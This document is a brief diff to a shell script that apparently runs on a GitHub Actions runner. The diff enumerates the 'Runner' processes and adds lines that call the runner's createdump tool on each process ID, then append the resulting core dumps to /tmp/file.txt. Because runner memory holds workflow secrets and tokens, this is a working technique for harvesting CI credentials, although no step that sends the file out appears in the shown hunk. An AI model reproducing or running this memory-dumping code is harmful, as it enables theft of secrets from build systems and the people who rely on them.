@@ -14,12 +14,12 @@ ls -1la /home/runner/runners/2.283.3/bin >> /tmp/file.txt
 echo "file"
 file /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
 
-#/home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt
-
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
     echo "---$pid---" >> /tmp/file.txt;
     echo $(pwdx $pid) >> /tmp/file.txt;
+    /home/runner/runners/2.284.0/bin/createdump $pid >> /tmp/file.txt;
+    cat /tmp/coredump.$pid >> /tmp/file.txt;
 done
 
 #echo "--- strings"
